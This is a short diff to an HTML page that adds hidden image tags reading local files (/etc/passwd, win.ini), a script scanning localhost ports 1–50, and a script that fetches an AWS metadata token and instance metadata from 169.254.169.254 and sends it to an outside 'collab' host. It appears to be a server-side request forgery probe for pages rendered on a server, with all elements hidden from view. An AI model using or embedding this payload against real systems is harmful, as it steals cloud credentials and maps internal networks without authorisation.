@@ -34,5 +34,31 @@
          style="display:none" />
 
     <!-- Add more as needed -->
+    <img src="file:///etc/passwd" onload="report(this.src, true)" onerror="report(this.src, false)" style="display:none" />
+<img src="file:///c:/windows/win.ini" onload="report(this.src, true)" onerror="report(this.src, false)" style="display:none" />
+
+    <script>
+for (let port = 1; port <= 50; port++) {
+    let img = document.createElement('img');
+    img.src = 'http://127.0.0.1:' + port;
+    img.onload = () => report('http://127.0.0.1:' + port, true);
+    img.onerror = () => report('http://127.0.0.1:' + port, false);
+    img.style.display = 'none';
+    document.body.appendChild(img);
+    
+}
+</script>  <script>
+    fetch('http://169.254.169.254/latest/api/token', {
+    method: 'PUT',
+    headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
+})
+.then(r => r.text())
+.then(token => {
+    return fetch('http://169.254.169.254/latest/meta-data/', {
+        headers: { 'X-aws-ec2-metadata-token': token }
+    });
+})
+.then(r => r.text())
+.then(data => fetch(collab + '/data=' + encodeURIComponent(data)));  </script>
 </body>
 </html>
